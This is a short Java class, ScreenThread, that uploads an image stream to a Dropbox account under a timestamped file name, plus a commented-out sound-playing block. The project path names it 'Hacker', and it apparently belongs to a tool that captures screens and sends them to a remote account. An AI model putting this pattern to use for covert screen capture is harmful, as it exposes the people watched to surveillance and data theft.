import com.dropbox.core.DbxException;
import com.dropbox.core.v2.DbxClientV2;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.sound.sampled.*;

public class ScreenThread extends Thread {

    DbxClientV2 client;
    InputStream in;
    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");

    public ScreenThread(DbxClientV2 client, InputStream in) {
        this.client = client;
        this.in = in;
    }

    @Override
    public void run() {
        //Upload image
        try {
            client.files().uploadBuilder("/" + dateFormat.format(new Date()) + ".jpg").uploadAndFinish(in);
        } catch (DbxException | IOException e) {
            e.printStackTrace();
        }

            /*//Create sound
            File soundFile = new File("F:\\JavaNoob\\Project\\Hacker\\src\\boiii.wav").getAbsoluteFile();
            try {
                AudioInputStream soundStream = AudioSystem.getAudioInputStream(soundFile);
                Clip clip = AudioSystem.getClip();
                clip.open(soundStream);
                clip.setFramePosition(0);
                clip.start();
                Thread.sleep(clip.getMicrosecondLength()/1000);
                clip.stop();
                clip.close();
            } catch (UnsupportedAudioFileException | IOException | LineUnavailableException | InterruptedException e) {
                e.printStackTrace();
            }*/
        }
    }
